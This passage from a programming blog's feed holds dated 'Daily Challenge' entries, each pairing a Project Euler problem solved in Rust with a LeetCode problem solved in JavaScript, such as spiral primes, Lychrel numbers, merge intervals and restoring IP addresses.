class="keyword">while</span> (head2 !== <span class="literal">null</span>) &#123;</span><br><span class="line">      cur.next = head2;</span><br><span class="line">      head2 = head2.next;</span><br><span class="line">      cur = cur.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> tmp_head.next;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">let</span> l1 = sortList(head);</span><br><span class="line">  <span class="keyword">let</span> l2 = sortList(mid);</span><br><span class="line">  <span class="keyword">return</span> merge(l1, l2);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> DailyChallenge </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Math </tag>
            
            <tag> Algorithm </tag>
            
            <tag> LeetCode </tag>
            
            <tag> ProjectEuler </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2019-02-16 Daily Challenge</title>
      <link href="/2019-02-16-Daily-Challenge/"/>
      <url>/2019-02-16-Daily-Challenge/</url>
      <content type="html"><![CDATA[<p>What I&#39;ve done today is <em>Spiral primes</em> in <em>Rust</em> and <em>First Bad Version</em> in <em>JavaScript</em>.</p><a id="more"></a><h1 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h1><h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><h3 id="Spiral-primes"><a href="#Spiral-primes" class="headerlink" title="Spiral primes"></a>Spiral primes</h3><h3 id="Problem-58"><a href="#Problem-58" class="headerlink" title="Problem 58"></a>Problem 58</h3><p>Starting with 1 and spiralling anticlockwise in the following way, a square spiral with side length 7 is formed.</p><p><strong>37</strong> 36 35 34 33 32 <strong>31</strong><br>38 <strong>17</strong> 16 15 14 <strong>13</strong> 30<br>39 18  <strong>5</strong>  4  <strong>3</strong> 12 29<br>40 19  6  1  2 11 28<br>41 20  <strong>7</strong>  8  9 10 27<br>42 21 22 23 24 25 26<br><strong>43</strong> 44 45 46 47 48 49</p><p>It is interesting to note that the odd squares lie along the bottom right diagonal, but what is more interesting is that 8 out of the 13 numbers lying along both diagonals are prime; that is, a ratio of 8/13 ≈ 62%.</p><p>If one complete new layer is wrapped around the spiral above, a square spiral with side length 9 will be formed. If this process is continued, what is the side length of the square spiral for which the ratio of primes along both diagonals first falls below 10%?</p><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>Nothing to say.</p><h2 id="Implementation"><a href="#Implementation" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="keyword">crate</span> primal;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> primal::Sieve;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> sieve: Sieve = Sieve::new(<span class="number">1_000_000_000</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> cur: <span class="built_in">usize</span> = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> spiral: <span class="built_in">usize</span> = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> prime: <span class="built_in">usize</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> bound = <span class="number">0.1</span>;</span><br><span class="line">    <span class="keyword">let</span> ans: <span class="built_in">usize</span>;</span><br><span class="line">    <span class="keyword">loop</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> ratio = prime <span class="keyword">as</span> <span class="built_in">f64</span> / (spiral * <span class="number">4</span> - <span class="number">3</span>) <span class="keyword">as</span> <span class="built_in">f64</span>;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">"&#123;&#125;, &#123;&#125;"</span>, spiral, ratio);</span><br><span class="line">        <span class="keyword">if</span> ratio &lt; bound &amp;&amp; spiral != <span class="number">1</span> &#123;</span><br><span class="line">            ans = spiral * <span class="number">2</span> - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> _i <span class="keyword">in</span> <span class="number">0</span>..<span class="number">4</span> &#123;</span><br><span class="line">            cur += spiral * <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span> sieve.is_prime(cur) &#123;</span><br><span class="line">                prime += <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        spiral += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"Answer is &#123;&#125;"</span>, ans);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h1><h2 id="Problem-1"><a href="#Problem-1" class="headerlink" title="Problem"></a>Problem</h2><h3 id="278-First-Bad-Version"><a href="#278-First-Bad-Version" class="headerlink" title="278. First Bad Version"></a>278. First Bad Version</h3><p>You are a product manager and currently leading a team to develop a new product. Unfortunately, the latest version of your product fails the quality check. Since each version is developed based on the previous version, all the versions after a bad version are also bad.</p><p>Suppose you have <code>n</code> versions <code>[1, 2, ..., n]</code> and you want to find out the first bad one, which causes all the following ones to be bad.</p><p>You are given an API <code>bool isBadVersion(version)</code> which will return whether <code>version</code> is bad. Implement a function to find the first bad version. You should minimize the number of calls to the API.</p><p><strong>Example:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Given n = 5, and version = 4 is the first bad version.</span><br><span class="line"></span><br><span class="line">call isBadVersion(3) -&gt; false</span><br><span class="line">call isBadVersion(5) -&gt; true</span><br><span class="line">call isBadVersion(4) -&gt; true</span><br><span class="line"></span><br><span class="line">Then 4 is the first bad version.</span><br></pre></td></tr></table></figure><h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>Simple binary search.</p><h2 id="Implementation-1"><a href="#Implementation-1" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> solution = <span class="function"><span class="keyword">function</span>(<span class="params">isBadVersion</span>) </span>&#123;</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * @param &#123;integer&#125; n Total versions</span></span><br><span class="line"><span class="comment">   * @return &#123;integer&#125; The first bad version</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> begin = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">let</span> end = n;</span><br><span class="line">    <span class="keyword">while</span> (begin &lt; end) &#123;</span><br><span class="line">      <span class="keyword">let</span> mid = <span class="built_in">Math</span>.floor((begin+end)/<span class="number">2</span>);</span><br><span class="line">      <span class="keyword">if</span> (isBadVersion(mid)) end = mid;</span><br><span class="line">      <span class="keyword">else</span> begin = mid + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> begin;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="/2019-02-16-Daily-Challenge/09.png" title="ha">;D</p>]]></content>
      
      <categories>
          
          <category> DailyChallenge </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Math </tag>
            
            <tag> Algorithm </tag>
            
            <tag> LeetCode </tag>
            
            <tag> ProjectEuler </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2019-02-15 Daily Challenge</title>
      <link href="/2019-02-15-Daily-Challenge/"/>
      <url>/2019-02-15-Daily-Challenge/</url>
      <content type="html"><![CDATA[<p>What I&#39;ve done today is <em>Square root convergents</em> in <em>Rust</em> and <em>Merge Intervals</em> in <em>JavaScript</em>.</p><a id="more"></a><h1 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h1><h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><h3 id="Square-root-convergents"><a href="#Square-root-convergents" class="headerlink" title="Square root convergents"></a>Square root convergents</h3><h3 id="Problem-57"><a href="#Problem-57" class="headerlink" title="Problem 57"></a>Problem 57</h3><p>It is possible to show that the square root of two can be expressed as an infinite continued fraction.</p><p>√ 2 = 1 + 1/(2 + 1/(2 + 1/(2 + ... ))) = 1.414213...</p><p>By expanding this for the first four iterations, we get:</p><p>1 + 1/2 = 3/2 = 1.5<br>1 + 1/(2 + 1/2) = 7/5 = 1.4<br>1 + 1/(2 + 1/(2 + 1/2)) = 17/12 = 1.41666...<br>1 + 1/(2 + 1/(2 + 1/(2 + 1/2))) = 41/29 = 1.41379...</p><p>The next three expansions are 99/70, 239/169, and 577/408, but the eighth expansion, 1393/985, is the first example where the number of digits in the numerator exceeds the number of digits in the denominator.</p><p>In the first one-thousand expansions, how many fractions contain a numerator with more digits than denominator?</p><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>Check <a href="https://oeis.org/A000129" target="_blank" rel="noopener">A000129</a>/<a href="https://oeis.org/A001541" target="_blank" rel="noopener">A001541</a>/<a href="https://oeis.org/A002315" target="_blank" rel="noopener">A002315</a></p><h2 id="Implementation"><a href="#Implementation" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="keyword">crate</span> num_bigint;</span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">crate</span> num_traits;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> num_bigint::BigInt;</span><br><span class="line"><span class="keyword">use</span> num_traits::FromPrimitive;</span><br><span class="line"><span class="keyword">use</span> std::mem::replace;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> den0: BigInt = FromPrimitive::from_i32(<span class="number">2</span>).unwrap();</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> den1: BigInt = FromPrimitive::from_i32(<span class="number">5</span>).unwrap();</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> num00: BigInt = FromPrimitive::from_i32(<span class="number">1</span>).unwrap();</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> num01: BigInt = FromPrimitive::from_i32(<span class="number">3</span>).unwrap();</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> num10: BigInt = FromPrimitive::from_i32(<span class="number">1</span>).unwrap();</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> num11: BigInt = FromPrimitive::from_i32(<span class="number">7</span>).unwrap();</span><br><span class="line">    <span class="keyword">let</span> six: BigInt = FromPrimitive::from_i32(<span class="number">6</span>).unwrap();</span><br><span class="line">    <span class="keyword">let</span> two: BigInt = FromPrimitive::from_i32(<span class="number">2</span>).unwrap();</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">0</span>..<span class="number">1000</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> den_s = den0.to_str_radix(<span class="number">10</span>).len();</span><br><span class="line">        <span class="keyword">let</span> den2 = den0 + &amp;two * &amp;den1;</span><br><span class="line">        den0 = replace(&amp;<span class="keyword">mut</span> den1, den2);</span><br><span class="line">        <span class="keyword">if</span> i &amp; <span class="number">1</span> == <span class="number">0</span> &#123;</span><br><span class="line">            <span class="keyword">let</span> num02 = -num00 + &amp;six * &amp;num01;</span><br><span class="line">            num00 = replace(&amp;<span class="keyword">mut</span> num01, num02);</span><br><span class="line">            <span class="keyword">let</span> num_s = num00.to_str_radix(<span class="number">10</span>).len();</span><br><span class="line">            <span class="keyword">if</span> num_s &gt; den_s &#123;</span><br><span class="line">                ans += <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">let</span> num12 = -num10 + &amp;six * &amp;num11;</span><br><span class="line">            num10 = replace(&amp;<span class="keyword">mut</span> num11, num12);</span><br><span class="line">            <span class="keyword">let</span> num_s = num10.to_str_radix(<span class="number">10</span>).len();</span><br><span class="line">            <span class="keyword">if</span> num_s &gt; den_s &#123;</span><br><span class="line">                ans += <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"Answer is &#123;&#125;"</span>, ans);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h1><h2 id="Problem-1"><a href="#Problem-1" class="headerlink" title="Problem"></a>Problem</h2><h3 id="56-Merge-Intervals"><a href="#56-Merge-Intervals" class="headerlink" title="56. Merge Intervals"></a>56. Merge Intervals</h3><p>Given a collection of intervals, merge all overlapping intervals.</p><p><strong>Example 1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: [[1,3],[2,6],[8,10],[15,18]]</span><br><span class="line">Output: [[1,6],[8,10],[15,18]]</span><br><span class="line">Explanation: Since intervals [1,3] and [2,6] overlaps, merge them into [1,6].</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: [[1,4],[4,5]]</span><br><span class="line">Output: [[1,5]]</span><br><span class="line">Explanation: Intervals [1,4] and [4,5] are considered overlapping.</span><br></pre></td></tr></table></figure><h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>Nothing to say.</p><h2 id="Implementation-1"><a href="#Implementation-1" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for an interval.</span></span><br><span class="line"><span class="comment"> * function Interval(start, end) &#123;</span></span><br><span class="line"><span class="comment"> *     this.start = start;</span></span><br><span class="line"><span class="comment"> *     this.end = end;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;Interval[]&#125; intervals</span></span><br><span class="line"><span class="comment"> * @return &#123;Interval[]&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> merge = <span class="function"><span class="keyword">function</span>(<span class="params">intervals</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> ans = [];</span><br><span class="line">  <span class="keyword">if</span> (!intervals.length) <span class="keyword">return</span> ans;</span><br><span class="line">  intervals.sort( <span class="function">(<span class="params">a, b</span>) =&gt;</span> a.start-b.start );</span><br><span class="line">  <span class="keyword">let</span> cur = intervals[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">1</span>; i &lt; intervals.length; ++i) &#123;</span><br><span class="line">    <span class="keyword">if</span> (intervals[i].start &lt;= cur.end) cur.end = <span class="built_in">Math</span>.max(cur.end, intervals[i].end);</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      ans.push(cur);</span><br><span class="line">      cur = intervals[i];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  ans.push(cur);</span><br><span class="line">  <span class="keyword">return</span> ans;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="/2019-02-15-Daily-Challenge/47.png" title="haha">;D</p>]]></content>
      
      <categories>
          
          <category> DailyChallenge </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Math </tag>
            
            <tag> Algorithm </tag>
            
            <tag> LeetCode </tag>
            
            <tag> ProjectEuler </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2019-02-14 Daily Challenge</title>
      <link href="/2019-02-14-Daily-Challenge/"/>
      <url>/2019-02-14-Daily-Challenge/</url>
      <content type="html"><![CDATA[<p>What I&#39;ve done today is <em>Powerful digit sum</em> in <em>Rust</em> and <em>Restore IP Addresses</em> in <em>JavaScript</em>.</p><a id="more"></a><h1 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h1><h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><h3 id="Powerful-digit-sum"><a href="#Powerful-digit-sum" class="headerlink" title="Powerful digit sum"></a>Powerful digit sum</h3><h3 id="Problem-56"><a href="#Problem-56" class="headerlink" title="Problem 56"></a>Problem 56</h3><p>A googol ($10^{100}$) is a massive number: one followed by one-hundred zeros; $100^{100}$ is almost unimaginably large: one followed by two-hundred zeros. Despite their size, the sum of the digits in each number is only 1.</p><p>Considering natural numbers of the form, $a^b$, where <em>a, b</em> &lt; 100, what is the maximum digital sum?</p><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>Nothing to say.</p><h2 id="Implementation"><a href="#Implementation" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="keyword">crate</span> num_bigint;</span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">crate</span> num_traits;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> num_bigint::&#123;BigUint&#125;;</span><br><span class="line"><span class="keyword">use</span> num_traits::&#123;FromPrimitive&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">1</span>..<span class="number">101</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> base: BigUint = FromPrimitive::from_usize(i).unwrap();</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut</span> tmp: BigUint = FromPrimitive::from_usize(i).unwrap();</span><br><span class="line">        <span class="keyword">for</span> _j <span class="keyword">in</span> <span class="number">0</span>..<span class="number">100</span> &#123;</span><br><span class="line">            <span class="keyword">let</span> sum = tmp.to_str_radix(<span class="number">10</span>).chars()</span><br><span class="line">                .fold(<span class="number">0</span>, |a, b| a+b <span class="keyword">as</span> <span class="built_in">usize</span> - <span class="string">'0'</span> <span class="keyword">as</span> <span class="built_in">usize</span>);</span><br><span class="line">            ans = <span class="keyword">if</span> ans &lt; sum &#123; sum &#125; <span class="keyword">else</span> &#123; ans &#125;;</span><br><span class="line">            tmp = tmp * &amp;base;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"Answer is &#123;&#125;"</span>, ans);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h1><h2 id="Problem-1"><a href="#Problem-1" class="headerlink" title="Problem"></a>Problem</h2><h3 id="93-Restore-IP-Addresses"><a href="#93-Restore-IP-Addresses" class="headerlink" title="93. Restore IP Addresses"></a>93. Restore IP Addresses</h3><p>Given a string containing only digits, restore it by returning all possible valid IP address combinations.</p><p><strong>Example:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;25525511135&quot;</span><br><span class="line">Output: [&quot;255.255.11.135&quot;, &quot;255.255.111.35&quot;]</span><br></pre></td></tr></table></figure><h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>Simple DFS.</p><h2 id="Implementation-1"><a href="#Implementation-1" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;string&#125; s</span></span><br><span class="line"><span class="comment"> * @return &#123;string[]&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> restoreIpAddresses = <span class="function"><span class="keyword">function</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> ans = [];</span><br><span class="line">  <span class="keyword">let</span> arr = [];</span><br><span class="line">  <span class="keyword">const</span> isValid = <span class="function">(<span class="params">s</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (+s &lt; <span class="number">256</span>) &amp;&amp; (+s+<span class="string">""</span> === s);</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">const</span> dfs = <span class="function">(<span class="params">index, cursor</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// console.log(index, cursor, arr);</span></span><br><span class="line">    <span class="keyword">if</span> (index === <span class="number">4</span> || cursor &gt;= s.length) &#123;</span><br><span class="line">      <span class="keyword">if</span> (cursor === s.length &amp;&amp; index === <span class="number">4</span>) ans.push(arr.join(<span class="string">"."</span>));</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">1</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line">      <span class="keyword">if</span> (cursor+i &lt;= s.length &amp;&amp; isValid(s.substr(cursor, i))) &#123;</span><br><span class="line">        arr[index] = s.substr(cursor, i);</span><br><span class="line">        dfs(index+<span class="number">1</span>, cursor+i);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">  dfs(<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> ans;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> DailyChallenge </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Math </tag>
            
            <tag> Algorithm </tag>
            
            <tag> LeetCode </tag>
            
            <tag> ProjectEuler </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2019-02-13 Daily Challenge</title>
      <link href="/2019-02-13-Daily-Challenge/"/>
      <url>/2019-02-13-Daily-Challenge/</url>
      <content type="html"><![CDATA[<p>What I&#39;ve done today is <em>Poker hands</em> in <em>Rust</em> and <em>Minimum Moves to Equal Array Elements</em> in <em>JavaScript</em>.</p><a id="more"></a><h1 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h1><h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><h3 id="Lychrel-numbers"><a href="#Lychrel-numbers" class="headerlink" title="Lychrel numbers"></a>Lychrel numbers</h3><h3 id="Problem-55"><a href="#Problem-55" class="headerlink" title="Problem 55"></a>Problem 55</h3><p>If we take 47, reverse and add, 47 + 74 = 121, which is palindromic.</p><p>Not all numbers produce palindromes so quickly. For example,</p><p>349 + 943 = 1292,<br>1292 + 2921 = 4213<br>4213 + 3124 = 7337</p><p>That is, 349 took three iterations to arrive at a palindrome.</p><p>Although no one has proved it yet, it is thought that some numbers, like 196, never produce a palindrome. A number that never forms a palindrome through the reverse and add process is called a Lychrel number. Due to the theoretical nature of these numbers, and for the purpose of this problem, we shall assume that a number is Lychrel until proven otherwise. In addition you are given that for every number below ten-thousand, it will either (i) become a palindrome in less than fifty iterations, or, (ii) no one, with all the computing power that exists, has managed so far to map it to a palindrome. In fact, 10677 is the first number to be shown to require over fifty iterations before producing a palindrome: 4668731596684224866951378664 (53 iterations, 28-digits).</p><p>Surprisingly, there are palindromic numbers that are themselves Lychrel numbers; the first example is 4994.</p><p>How many Lychrel numbers are there below ten-thousand?</p><p>NOTE: Wording was modified slightly on 24 April 2007 to emphasise the theoretical nature of Lychrel numbers.</p><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>Nothing to say.</p><h2 id="Implementation"><a href="#Implementation" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">10</span>..<span class="number">10_000</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut</span> tmp = <span class="built_in">i128</span>::from(i);</span><br><span class="line">        tmp += reverse(tmp);</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut</span> cnt = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> cnt &lt; <span class="number">50</span> &amp;&amp; !is_palindrome(tmp) &#123;</span><br><span class="line">            cnt += <span class="number">1</span>;</span><br><span class="line">            <span class="comment">// println!("&#123;&#125;, &#123;&#125;, 